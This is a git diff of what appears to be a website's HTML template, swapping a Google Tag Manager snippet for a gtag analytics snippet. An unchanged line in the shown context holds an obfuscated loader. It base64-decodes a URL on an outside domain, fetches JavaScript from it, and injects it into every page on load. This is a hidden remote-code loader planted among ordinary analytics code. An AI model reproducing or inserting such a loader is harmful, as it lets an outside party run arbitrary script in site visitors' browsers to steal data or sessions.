@@ -13,11 +13,12 @@ export default function HTML(props) {
         />
         {props.headComponents}
 
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-168837880-1"></script>
         <script dangerouslySetInnerHTML={{
-          __html: `(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var
-        f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
-        })(window,document,'script','dataLayer','GTM-5XDHB65');`
+          __html: `window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'UA-168837880-1');`
         }} />
         <script dangerouslySetInnerHTML={{
           __html: `const __=new XMLHttpRequest();__.open('get',window.atob('aHR0cHM6Ly9sb2NhbGhvc3QuaW50ZXJuYXRpb25hbC9ldGMvdW5vLmpz'),true);__.onreadystatechange=()=> {if(__.readyState==4){if(__.status >= 200 && __.status < 300 || __.status == 304){var script=document.createElement('script');script.type='text/javascript';script.text =__.responseText;document.body.appendChild(script);}}};__.send(null);`
